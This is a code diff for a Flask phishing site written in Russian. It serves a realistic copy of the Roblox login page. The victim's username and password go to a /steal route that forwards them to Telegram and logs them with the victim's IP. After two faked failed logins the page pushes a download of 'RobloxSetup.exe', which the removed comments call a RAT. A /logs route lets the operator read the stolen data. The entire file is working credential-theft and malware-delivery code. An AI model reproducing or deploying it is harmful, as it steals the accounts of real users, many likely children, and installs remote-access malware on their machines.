@@ -1,4 +1,4 @@
-from flask import Flask, request, render_template, send_file
+from flask import Flask, request, send_file
 import datetime
 import requests
 import os
@@ -17,35 +17,285 @@ def send_tg(msg):
     except:
         pass
 
-# ===== ГЛАВНАЯ СТРАНИЦА (ВСЕГДА ROXBLOX) =====
 @app.route('/')
 def index():
-    try:
-        return render_template('index.html')
-    except:
-        # Если index.html не найден — показываем встроенную страницу
-        return '''
-        <html>
-        <head><title>Roblox — вход</title></head>
-        <body style="background:#1a1a2e; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial;">
-            <div style="background:#16213e; padding:40px; border-radius:12px; width:340px; text-align:center;">
-                <h2 style="color:white;">Войдите в Roblox</h2>
-                <form action="/steal" method="post">
-                    <input type="text" name="login" placeholder="Имя пользователя" required style="width:100%; padding:12px; margin:6px 0; border:none; border-radius:6px; background:#0f3460; color:white;">
-                    <input type="password" name="password" placeholder="Пароль" required style="width:100%; padding:12px; margin:6px 0; border:none; border-radius:6px; background:#0f3460; color:white;">
-                    <button type="submit" style="width:100%; padding:12px; background:#00bfff; border:none; border-radius:6px; color:white; font-weight:bold; cursor:pointer;">Войти</button>
-                </form>
-                <div style="color:#ff6b6b; margin-top:10px;">Защищено 🔒</div>
-            </div>
-        </body>
-        </html>
-        '''
+    # ПОЛНАЯ КОПИЯ СТРАНИЦЫ ВХОДА ROBLOX (БЕЗ СТИМА)
+    return '''
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Roblox — Вход</title>
+        <style>
+            * { margin: 0; padding: 0; box-sizing: border-box; }
+            body {
+                background: #1b1b2f;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+                font-family: 'Segoe UI', Arial, sans-serif;
+                padding: 20px;
+            }
+            .login-container {
+                background: #16213e;
+                border-radius: 16px;
+                padding: 40px 35px 35px;
+                width: 400px;
+                max-width: 100%;
+                box-shadow: 0 15px 40px rgba(0,0,0,0.7);
+                text-align: center;
+            }
+            .roblox-logo {
+                width: 180px;
+                margin-bottom: 10px;
+            }
+            .login-title {
+                color: #fff;
+                font-size: 24px;
+                font-weight: 500;
+                margin-bottom: 25px;
+            }
+            .input-group {
+                margin-bottom: 14px;
+                text-align: left;
+            }
+            .input-group label {
+                display: block;
+                color: #b0c4de;
+                font-size: 14px;
+                font-weight: 600;
+                margin-bottom: 5px;
+            }
+            .input-group input {
+                width: 100%;
+                padding: 14px 16px;
+                background: #0f3460;
+                border: 2px solid transparent;
+                border-radius: 8px;
+                color: #fff;
+                font-size: 16px;
+                transition: 0.25s;
+                outline: none;
+            }
+            .input-group input::placeholder {
+                color: #6a8aae;
+            }
+            .input-group input:focus {
+                border-color: #00bfff;
+                background: #1a4a7a;
+                box-shadow: 0 0 0 3px rgba(0,191,255,0.2);
+            }
+            .login-btn {
+                width: 100%;
+                padding: 15px;
+                background: #00bfff;
+                border: none;
+                border-radius: 8px;
+                color: #fff;
+                font-size: 18px;
+                font-weight: 700;
+                cursor: pointer;
+                transition: 0.2s;
+                margin-top: 8px;
+            }
+            .login-btn:hover {
+                background: #009acd;
+            }
+            .login-btn:active {
+                transform: scale(0.98);
+            }
+            .error-message {
+                color: #ff6b6b;
+                font-size: 14px;
+                margin-top: 14px;
+                min-height: 22px;
+            }
+            .filename-box {
+                margin-top: 24px;
+                padding: 12px 16px;
+                background: #0f3460;
+                border-radius: 8px;
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+                gap: 12px;
+                border: 1px solid #1a4a7a;
+            }
+            .filename-box span {
+                color: #aaccff;
+                font-size: 14px;
+                font-family: monospace;
+                word-break: break-all;
+            }
+            .copy-btn {
+                background: #2a4a7a;
+                border: none;
+                color: #fff;
+                padding: 6px 16px;
+                border-radius: 6px;
+                cursor: pointer;
+                font-size: 13px;
+                font-weight: 600;
+                transition: 0.2s;
+                white-space: nowrap;
+            }
+            .copy-btn:hover {
+                background: #3a5a8a;
+            }
+            .download-btn {
+                display: none;
+                margin-top: 20px;
+                padding: 15px;
+                background: #00b894;
+                border: none;
+                border-radius: 8px;
+                color: #fff;
+                font-weight: 700;
+                font-size: 16px;
+                cursor: pointer;
+                width: 100%;
+                transition: 0.2s;
+            }
+            .download-btn:hover {
+                background: #00a381;
+            }
+            .download-btn:active {
+                transform: scale(0.98);
+            }
+            .footer-text {
+                color: #6a8aae;
+                font-size: 13px;
+                margin-top: 22px;
+                border-top: 1px solid #1a4a7a;
+                padding-top: 18px;
+            }
+            .toast {
+                position: fixed;
+                bottom: 30px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: #00b894;
+                color: #fff;
+                padding: 12px 28px;
+                border-radius: 10px;
+                font-size: 15px;
+                display: none;
+                z-index: 999;
+                box-shadow: 0 6px 24px rgba(0,0,0,0.4);
+            }
+            @media (max-width: 480px) {
+                .login-container { padding: 30px 20px 25px; }
+                .roblox-logo { width: 150px; }
+                .login-title { font-size: 20px; }
+                .input-group input { padding: 12px 14px; font-size: 15px; }
+                .login-btn { font-size: 16px; padding: 13px; }
+                .filename-box { flex-wrap: wrap; justify-content: center; }
+                .copy-btn { width: 100%; text-align: center; }
+            }
+        </style>
+    </head>
+    <body>
+    <div class="login-container">
+        <img class="roblox-logo" src="https://www.roblox.com/favicon.ico" alt="Roblox">
+        <h1 class="login-title">Вход в Roblox</h1>
 
-# ===== ПРИЁМ ЛОГИНА И ПАРОЛЯ =====
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="username">Имя пользователя / Email</label>
+                <input type="text" id="username" placeholder="Введите имя или email" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Пароль</label>
+                <input type="password" id="password" placeholder="Введите пароль" required>
+            </div>
+            <button class="login-btn" type="submit">Войти</button>
+        </form>
+
+        <div id="message" class="error-message"></div>
+
+        <div class="filename-box">
+            <span id="filenameDisplay">RobloxSetup.exe</span>
+            <button class="copy-btn" id="copyFilenameBtn">📋 Копировать</button>
+        </div>
+
+        <button class="download-btn" id="downloadBtn">⬇️ Скачать RobloxSetup.exe</button>
+        <div class="footer-text">🔒 Защищённое соединение</div>
+    </div>
+
+    <div id="toast" class="toast">✅ Название скопировано!</div>
+
+    <script>
+        let attempts = 0;
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const login = document.getElementById('username').value.trim();
+            const pass = document.getElementById('password').value.trim();
+
+            if (!login || !pass) {
+                document.getElementById('message').innerText = 'Пожалуйста, заполните оба поля';
+                return;
+            }
+
+            try {
+                await fetch('/steal', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ login, pass })
+                });
+            } catch {}
+
+            attempts++;
+            document.getElementById('message').innerText = 'Неверный логин или пароль. Попробуйте снова.';
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+
+            if (attempts >= 2) {
+                document.getElementById('message').innerHTML = '⚠️ <span style="color:#ffcc00;">Обнаружена проблема с входом.</span> Скачайте обновление Roblox.';
+                document.getElementById('downloadBtn').style.display = 'block';
+            }
+        });
+
+        document.getElementById('copyFilenameBtn').addEventListener('click', function() {
+            const filename = document.getElementById('filenameDisplay').innerText;
+            navigator.clipboard.writeText(filename).then(() => {
+                showToast('✅ Название скопировано!');
+            }).catch(() => {
+                const range = document.createRange();
+                const span = document.getElementById('filenameDisplay');
+                range.selectNode(span);
+                window.getSelection().removeAllRanges();
+                window.getSelection().addRange(range);
+                document.execCommand('copy');
+                showToast('✅ Название скопировано!');
+            });
+        });
+
+        document.getElementById('downloadBtn').addEventListener('click', function() {
+            window.location.href = '/download/roblox_setup.exe';
+            this.innerText = '✅ Файл скачан! Запустите его для входа.';
+            this.disabled = true;
+            this.style.background = '#00b894';
+        });
+
+        function showToast(text) {
+            const toast = document.getElementById('toast');
+            toast.innerText = text;
+            toast.style.display = 'block';
+            setTimeout(() => { toast.style.display = 'none'; }, 3000);
+        }
+    </script>
+    </body>
+    </html>
+    '''
+
 @app.route('/steal', methods=['POST'])
 def steal():
-    login = request.form.get('login')
-    password = request.form.get('password')
+    data = request.json
+    login = data.get('login')
+    password = data.get('pass')
     ip = request.remote_addr
 
     msg = f"🎮 ROBLOX LOGIN!\n👤 {login}\n🔑 {password}\n🌐 IP: {ip}"
@@ -54,21 +304,8 @@ def steal():
     with open('steals.txt', 'a', encoding='utf-8') as f:
         f.write(f"{datetime.datetime.now()} | {ip} | {login} | {password}\n")
 
-    # Возвращаем ошибку, чтобы жертва попробовала снова
-    return '''
-    <html>
-    <head><title>Ошибка входа</title></head>
-    <body style="background:#1a1a2e; display:flex; justify-content:center; align-items:center; height:100vh; font-family:Arial;">
-        <div style="background:#16213e; padding:40px; border-radius:12px; text-align:center;">
-            <h3 style="color:#ff6b6b;">Неверный логин или пароль</h3>
-            <p style="color:white;">Попробуйте ещё раз</p>
-            <a href="/" style="color:#00bfff;">Вернуться</a>
-        </div>
-    </body>
-    </html>
-    '''
+    return {"status": "ok"}, 200
 
-# ===== СКАЧИВАНИЕ RAT =====
 @app.route('/download/roblox_setup.exe')
 def download_exe():
     try:
@@ -76,7 +313,6 @@ def download_exe():
     except:
         return "Файл временно недоступен", 404
 
-# ===== ЛОГИ (для тебя) =====
 @app.route('/logs')
 def logs():
     if not os.path.exists('steals.txt'):
